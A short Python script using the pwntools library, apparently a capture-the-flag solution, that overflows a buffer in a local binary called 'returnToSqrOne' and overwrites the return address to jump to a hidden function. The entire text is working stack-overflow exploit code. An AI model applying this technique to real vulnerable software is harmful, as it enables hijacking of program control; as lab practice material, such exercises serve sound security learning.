from pwn import *

p = process('./returnToSqrOne')
elf = p.elf

payload = b'A' * 0x10c
payload += p32(elf.symbols['PlzDontCallThisItsASecretFunction'])

p.sendlineafter(b'!\n', payload)

p.interactive()
p.close()